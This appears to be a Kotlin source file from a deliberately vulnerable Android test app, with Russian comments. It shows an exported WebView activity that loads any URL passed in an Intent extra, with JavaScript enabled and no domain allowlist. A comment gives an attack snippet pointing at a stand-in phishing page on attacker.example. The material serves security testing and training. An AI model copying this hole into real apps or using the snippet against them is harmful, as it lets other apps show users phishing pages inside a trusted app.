package com.masttest.vuln24

import android.annotation.SuppressLint
import android.os.Bundle
import android.webkit.WebView
import androidx.appcompat.app.AppCompatActivity

/**
 * VULN-24: WebView грузит произвольный URL из Intent extras
 * без allowlist'а доменов.
 *
 * Атака:
 *   val i = Intent().apply {
 *     component = ComponentName(
 *       "com.masttest.vuln24",
 *       "com.masttest.vuln24.WebViewActivity"
 *     )
 *     putExtra("url", "https://attacker.example/phish.html")
 *   }
 *   startActivity(i)
 *
 * Activity exported=true (см. манифест), любое стороннее
 * приложение может запустить WebView с любым URL внутри нашего
 * приложения — отлично для phishing'а (показывается логотип,
 * пользователь думает что он внутри легитимного app).
 */
class WebViewActivity : AppCompatActivity() {
    @SuppressLint("SetJavaScriptEnabled")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_webview)

        val web: WebView = findViewById(R.id.web)
        web.settings.javaScriptEnabled = true

        val url = intent.getStringExtra("url") ?: "about:blank"
        web.loadUrl(url)                                       // <-- VULN sink
    }
}
